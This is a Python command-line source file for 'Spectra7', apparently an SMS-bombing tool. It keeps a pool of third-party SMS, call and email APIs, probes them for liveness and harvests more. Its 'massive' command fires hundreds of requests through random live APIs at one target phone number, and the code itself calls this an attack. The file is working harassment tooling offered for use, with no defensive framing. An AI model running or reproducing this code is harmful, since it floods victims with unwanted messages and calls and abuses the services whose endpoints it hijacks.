"""
Spectra7 CLI — selftest, harvest, massive attack.
Usage:
  python cli.py info
  python cli.py selftest [number]
  python cli.py harvest [max_candidates]
  python cli.py massive <number> [count]
  python cli.py alive
"""
import sys, os, time, json, random, re
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(__file__))

from core.api_aggregator import (
    load_apis, save_apis, probe_api, refresh_liveness, _alive, send_request,
    get_apis_for_type, get_alive_apis
)
from core.harvester import run_harvest, merge_into_apis


def cmd_info():
    apis = load_apis()
    total = 0
    by_type = {}
    for atype in apis:
        by_type[atype] = {"total": 0, "by_cc": {}}
        for ccode in apis[atype]:
            count = len(apis[atype][ccode])
            by_type[atype]["by_cc"][ccode] = count
            by_type[atype]["total"] += count
            total += count

    alive_count = sum(1 for v in _alive.values() if v)
    dead_count = sum(1 for v in _alive.values() if not v)

    print(f"\n{'='*50}")
    print(f"  Spectra7 API Pool")
    print(f"{'='*50}")
    for atype in ("sms", "call", "email"):
        info = by_type.get(atype, {"total": 0, "by_cc": {}})
        if info["total"]:
            parts = [f"  {atype.upper()}: {info['total']}" ]
            for cc, n in info["by_cc"].items():
                parts.append(f"[{cc}: {n}]")
            print("  ".join(parts))
    print(f"{'='*50}")
    print(f"  Total: {total} | Alive: {alive_count} | Dead: {dead_count}")
    print(f"  Run 'selftest' to probe APIs | 'harvest' to discover more")
    print()


def cmd_selftest(target="9876543210", cc="91"):
    apis = load_apis()
    all_apis = []
    for atype in apis:
        for ccode in apis[atype]:
            all_apis.extend(apis[atype][ccode])

    print(f"[selftest] Testing {len(all_apis)} APIs against +{cc}-{target}...")

    results = []
    tested = 0
    with ThreadPoolExecutor(max_workers=25) as ex:
        futures = {ex.submit(probe_api, api, cc, target): api for api in all_apis}
        for fut in as_completed(futures):
            tested += 1
            api = futures[fut]
            r = fut.result()
            r["name"] = api.get("name", "?")
            results.append(r)
            if r["alive"]:
                print(f"  OK #{tested:3d} {r['name'][:18]:18s} HTTP {r['status']}")
            elif tested % 15 == 0:
                alive = sum(1 for x in results if x["alive"])
                print(f"  ... {tested}/{len(all_apis)} tested, {alive} alive")

    alive = [r for r in results if r["alive"]]
    dead = [r for r in results if not r["alive"]]
    print(f"\n  Result: {len(alive)} alive, {len(dead)} dead out of {len(all_apis)}")
    if alive:
        print("  Working:")
        for r in alive:
            print(f"    OK {r['name'][:20]:20s} HTTP {r['status']}")


def cmd_harvest(max_candidates=500):
    print("=" * 50)
    print("  Spectra7 Harvester")
    print("=" * 50)
    working = run_harvest(max_candidates=max_candidates, workers=25, timeout=8)
    if working:
        merge_into_apis(working)
    print("\n  Done. Run 'python cli.py info' for updated stats.\n")


def cmd_massive(target=None, count=200):
    if not target:
        print("Usage: python cli.py massive <number> [count]")
        return

    cc = "91"
    raw = target.replace("+", "").replace(" ", "")
    if raw.startswith("91") and len(raw) > 10:
        cc, target = "91", raw[2:]
    target = re.sub(r'\D', '', target)

    print(f"[massive] Target +{cc}-{target} x{count}")
    print(f"[massive] Running liveness check...")
    refresh_liveness(force=True)

    sms_apis = get_alive_apis("sms", cc)
    if not sms_apis:
        print("[!] No alive APIs. Run 'selftest' or 'harvest' first.")
        return

    print(f"[massive] {len(sms_apis)} alive APIs loaded")
    start = time.time()
    sent = success = failed = 0

    try:
        for i in range(count):
            api = random.choice(sms_apis)
            delay = 0.5 if i > 0 else 0
            result = send_request(api, cc, target, delay=delay)
            sent += 1
            if result.get("status") == "success":
                success += 1
            else:
                failed += 1
            if (i + 1) % 10 == 0 or i == count - 1:
                elapsed = time.time() - start
                print(f"  [{i+1:4d}/{count}] S:{success} F:{failed} "
                      f"({sent/elapsed:.1f}/s) | {api.get('name','?')}")
    except KeyboardInterrupt:
        print("\n[massive] Stopped")

    elapsed = time.time() - start
    print(f"\n  Attack done: {sent} sent, {success} success, {failed} failed in {elapsed:.1f}s")


def cmd_alive():
    apis = load_apis()
    all_apis = []
    for atype in apis:
        for ccode in apis[atype]:
            all_apis.extend(apis[atype][ccode])
    refresh_liveness(force=True)
    alive = [a for a in all_apis if _alive.get(a["url"], False)]
    print(f"\nAlive APIs ({len(alive)}):\n")
    for a in sorted(alive, key=lambda x: x.get("name","")):
        print(f"  OK {a['name'][:20]:20s} {a.get('method','POST'):5s} {a['url'][:80]}")
    print()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    cmd = sys.argv[1]
    if cmd == "info":
        cmd_info()
    elif cmd == "selftest":
        target = sys.argv[2] if len(sys.argv) > 2 else "9876543210"
        cmd_selftest(target)
    elif cmd == "harvest":
        max_c = int(sys.argv[2]) if len(sys.argv) > 2 else 500
        cmd_harvest(max_c)
    elif cmd == "massive":
        target = sys.argv[2] if len(sys.argv) > 2 else None
        count = int(sys.argv[3]) if len(sys.argv) > 3 else 200
        cmd_massive(target, count)
    elif cmd == "alive":
        cmd_alive()
    else:
        print(f"Unknown: {cmd}")
        print(__doc__)
